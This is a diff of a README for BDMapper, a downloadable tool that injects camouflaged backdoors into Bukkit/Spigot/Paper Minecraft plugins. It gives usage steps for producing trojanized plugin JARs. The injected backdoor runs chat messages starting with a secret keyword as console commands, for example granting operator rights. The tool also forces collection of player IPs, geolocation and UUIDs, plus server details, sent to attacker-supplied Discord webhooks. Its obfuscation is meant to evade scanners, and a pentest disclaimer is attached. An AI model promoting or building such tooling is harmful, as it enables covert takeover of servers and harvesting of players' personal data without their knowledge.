@@ -1,95 +1,104 @@
-<div align="center"><h1>BDMapper - Minecraft plugin backdoor injector</h1></div>
+<div align="center"><h1>BDMapper — Professional Backdoor Injection Framework for Minecraft Plugins</h1></div>
 <div align="center"><img alt="Logo" src="l.png"/></div>
 <div align="center">
   <a href="https://github.com/VoxelHax/BDMapper/releases/latest"><img alt="Download" src="https://img.shields.io/badge/-DOWNLOAD_LATEST_RELEASE_(CLICK)-blue?style=for-the-badge"/></a>
 </div>
 
-Languages: English, Русский
+**Languages:** English, Русский
 
-BDMapper (BackDoorMapper) is a modern and powerful universal backdoor injector compatible with all Bukkit/Spigot/Paper/etc plugins. Its feature is the ability to integrate with absolutely any plugin without the need to modify the backdoor every time. Moreover, it provides a powerful camouflage engine, which makes it nearly impossible to find without sufficient knowledge or advanced automated tools. BDMapper was developed to test the security systems of Minecraft servers; the VoxelHax team is not responsible for its misuse.
+---
 
-This is a continuation of the Bukloit project, taking into account all the problems of the previous project and a completely different approach to development.
-BDMapper features
+## Overview
 
-    Full support for Bukkit and its forks on any Minecraft version.
+**BDMapper (BackDoorMapper)** is a modern, high‑performance, and universal tool for injecting backdoors into Bukkit, Spigot, Paper, and any of their forks. Its key advantage is **full independence from the target plugin** – injection is performed without any manual adaptation of the code to each specific JAR file. The built‑in camouflage engine makes the injected code extremely difficult to detect, even for specialised automated scanners.
 
-    Built‑in backdoor with custom activation keyword.
+The product is developed by **NyashSystem** and is intended exclusively for authorised penetration testing and security evaluation of Minecraft server infrastructures. **Unauthorised use of BDMapper without explicit written permission from the server owner is strictly prohibited.** I, as the sole developer, assume no liability for any damage caused by unauthorised or illegal use of this tool.
 
-    Automatic JDK downloading, so you don't need to care about Java version compatibility.
+---
 
-    Powerful camouflage engine, which makes it harder to find the backdoor in the plugin.
+## Key Features
 
-    Built‑in telemetry – you can forward collected player/server information to your own Discord webhook for monitoring and debugging.
+- **Complete Compatibility** – Supports all versions of Bukkit and its forks without any version restrictions.
+- **Built‑in Backdoor** – A ready‑to‑use module activated by a keyword in chat.
+- **Automatic JDK Download** – The tool automatically selects and installs the required Java version, freeing the user from version‑compatibility concerns.
+- **Advanced Camouflage Engine** – Injected code is obfuscated and stylised to match the original plugin’s bytecode, effectively resisting both manual reverse‑engineering and signature‑based scanners.
+- **Mandatory Two‑Channel Telemetry** – The injector requires **two separate Discord Webhook URLs** to operate:  
+  - one for **player connection events** (including full geolocation and client data);  
+  - another for **server startup logs** (core information, plugin list, configuration, etc.).  
+  *These data are critical for monitoring and analysing test results. Injection will not proceed without both webhooks.*
 
-Installation
+---
 
-Download the latest BDMapper.exe from the releases tab. No additional setup is required – just place the executable anywhere you like.
-Usage
+## Installation
 
-Using BDMapper is as simple as drag‑and‑drop:
+1. Download the latest `BDMapper.exe` from the [Releases](https://github.com/VoxelHax/BDMapper/releases/latest) page.  
+2. Place the executable in any directory of your choice. No additional environment setup is required.
 
-    Drag any .jar plugin file onto BDMapper.exe.
+---
 
-    A small window will appear asking for:
+## Usage Instructions
 
-        Target Key – the secret keyword that will trigger console commands when typed in chat (e.g., #console).
+The workflow is extremely simple and follows a **drag‑and‑drop** approach:
 
-        Discord Webhook URL (optional) – if provided, telemetry data will be sent to your Discord channel. Leave empty to disable telemetry.
+1. Drag the target `.jar` plugin file onto `BDMapper.exe`.  
+2. A configuration dialog will appear, prompting you to provide:
+   - **Activation Key** – a secret word that, when prefixed to a chat message, will execute the remainder as a console command (e.g., `#console`).  
+   - **Player Logs Webhook** – the URL where data about each player connection (IP, geolocation, client, UUID, etc.) will be sent. **This field is mandatory.**  
+   - **Server Logs Webhook** – the URL for receiving system startup information (core, Bukkit version, plugin list, server IP, etc.). **This field is also mandatory.**  
+3. Click **Inject** – the modified plugin with the injected backdoor will be saved in the same folder, with `_patched` appended to the filename (e.g., `MyPlugin_patched.jar`).
 
-    Click Inject – the modified plugin (with the backdoor) will be saved in the same folder as the original, with _patched added to the filename (e.g., MyPlugin_patched.jar).
+No command‑line parameters or complex configuration files are needed.
 
-That’s it! No command‑line arguments, no complex configuration.
-Telemetry and collected data
+---
 
-If you provide a Discord webhook URL, the injected plugin (when running on a server) will automatically send the following data to your Discord channel:
-Player connection data (when a player joins)
+## Telemetry Data Collected
 
-    Skin (player's skin texture URL or hash)
+### 1. Player Logs (sent on each connection)
+- Player skin texture URL or hash  
+- Player UUID  
+- Client brand (Fabric, Forge, Vanilla, etc.)  
+- Client version (as reported by the player)  
+- Geolocation (country and city, e.g., *United Kingdom > London*)  
+- Public IP address and port  
 
-    UUID (e.g., 77bcc289-45dc-365d-b3fb-389dc32dbb81)
+### 2. Server Logs (sent once at startup)
+- Server core (Paper, Spigot, Bukkit, Purpur, etc.)  
+- Name of the injected plugin  
+- Bukkit API version  
+- Hosting country (server geolocation)  
+- Public server IP and port  
+- The configured activation keyword  
+- Complete list of all installed plugins (for environmental profiling)  
 
-    Client type (Fabric, Forge, Vanilla, etc.)
+**Important:** All data are transmitted exclusively to the webhooks you provide. No information is stored by the developer, shared with third parties, or used for any other purpose. Refusal to provide either webhook will abort the injection process.
 
-    Client version (Minecraft version reported by the player)
+---
 
-    Geolocation (e.g., United Kingdom > London)
+## Built‑in Backdoor Mechanism
 
-    IP address and port (e.g., 249.255.202.213:53371)
+The backdoor is deliberately simple yet functionally effective: any chat message beginning with the configured **activation key** is interpreted as a console command and executed by the server.
 
-Server information (gathered once at startup)
+**Example:**  
+With the key `#console`, typing in chat:  
+`#console op MyName`  
+will execute `op MyName` in the console, granting operator privileges to the player `MyName`.
 
-    Core (Paper, Spigot, Bukkit, Purpur, etc.)
+---
 
-    Patched Plugin – the name of the plugin that was injected
+## Camouflage Engine
 
-    Bukkit version (server's Bukkit API version)
+All injected code is deeply obfuscated and adapted to mimic the style of the original plugin, making it nearly indistinguishable from legitimate components. This significantly hinders detection through both manual reverse‑engineering and most automated scanners.
 
-    Hosting country (where the server is physically located)
+---
 
-    Server IP and port (public address)
+## Advanced Usage (For Expert Users)
 
-    Target Key – the activation keyword you set
+While BDMapper is optimised for its built‑in backdoor, advanced users may replace it with a custom exploit by pre‑injecting the necessary classes into the target plugin. This procedure requires manual bytecode manipulation and is not covered in this guide. For the vast majority of testing scenarios, the standard backdoor and telemetry functionality is sufficient.
 
-    List of all installed plugins (to understand the server environment)
+---
 
-    Important: The data is collected only when the backdoor is active on a live server. No data is ever stored or sent to any third party – it goes directly to the webhook you specify. If you do not provide a webhook, no telemetry is sent.
+## Legal Disclaimer and Liability
 
-Built‑in backdoor
+BDMapper is provided **solely for legitimate security testing, penetration testing, and educational awareness**. Any use of this tool without prior written consent from the owner of the target system is illegal and unethical.
 
-The injected backdoor is simple but powerful: any chat message starting with your Target Key will be executed as a console command.
-
-Example:
-If you set the key to #console, typing in chat:
-text
-
-#console op MyName
-
-will execute op MyName as the server console, granting operator status to MyName.
-Camouflage
-
-By default, the backdoor code is heavily obfuscated and camouflaged to blend in with the original plugin's code. This makes manual detection very difficult and renders most automated scanners ineffective.
-Custom backdoors (advanced)
-
-BDMapper is primarily designed for the built‑in backdoor, but advanced users can replace it by placing a custom exploit class inside the plugin before dragging. This requires manual modification of the plugin’s bytecode and is not covered in this guide. For most purposes, the built‑in backdoor and telemetry provide all the functionality needed for security testing.
-
-Disclaimer: BDMapper is intended for security testing and educational purposes only. The authors are not liable for any damage or illegal activity caused by this tool. Always obtain proper authorization before testing any server.
+**I, the developer of BDMapper (NyashSystem), accept no responsibility for any direct or indirect damage resulting from unauthorised, unsanctioned, or illegal use of this software.** The user agrees to comply with all applicable laws and regulations and bears full personal responsibility for the consequences of their actions.
